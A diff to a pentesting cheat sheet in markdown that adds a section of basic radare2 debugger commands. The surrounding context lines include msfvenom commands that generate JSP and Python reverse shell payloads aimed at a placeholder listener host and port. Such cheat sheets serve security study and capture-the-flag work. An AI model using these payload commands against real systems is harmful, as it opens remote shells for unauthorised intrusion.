@@ -60,6 +60,7 @@ PHP Meterpreter Reverse TCP
 
 ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp``` : JSP Java Meterpreter Reverse TCP
 
+
 ## Scripting Payloads
 
 ```msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py``` : Python Reverse Shell
@@ -125,6 +126,26 @@ Run
 
 display the first few lines of a file ```head file.txt```
 display the last few lines of a file ```tail file.txt```
+
+# Radare 2
+
+```r2 -d <program>``` : Start program in radare2
+  
+```aaa``` : analyze program
+
+```afl``` : list of functions from program
+
+```pdf @<function-name>``` : Go to function from list
+
+```db <memory location>``` : breakpoint
+
+```ds``` : step through
+
+```dc``` : start program execution/and run again after breakpoint
+
+```dr``` : show register values
+
+```px @ <variable>``` : show memory for entered variable
 
 # Web-Server
 
